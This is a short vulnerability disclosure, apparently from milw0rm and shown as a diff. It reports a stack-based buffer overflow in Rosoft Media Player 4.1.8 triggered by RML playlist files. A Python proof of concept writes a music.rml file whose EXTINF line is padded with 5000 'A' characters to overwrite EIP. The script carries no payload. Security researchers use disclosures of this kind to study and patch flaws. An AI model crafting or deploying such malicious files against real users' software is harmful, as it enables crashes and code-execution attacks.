@@ -1,0 +1,20 @@
+Description:
+This is nothing special - there is just flaw in Rosoft Media Player 4.1.8, similar to one discovered by Juan Pablo Lopez Yacubian. 
+This one concerns RML file. This is Stack Based Buffer Overflow vulerability - we can ovewrite EIP. I hope that it was not reported before. 
+
+Author: Wiktor Sierocinski
+POC:
+
+#!/usr/bin/python
+
+content = (
+"#EXTINF:Played=0\n" + "A" * 5000 + "\n"
+)
+
+fd = open("music.rml","w");
+fd.write(content)
+fd.close();
+
+print "RML FILE CREATED"
+
+# milw0rm.com [2008-03-15]
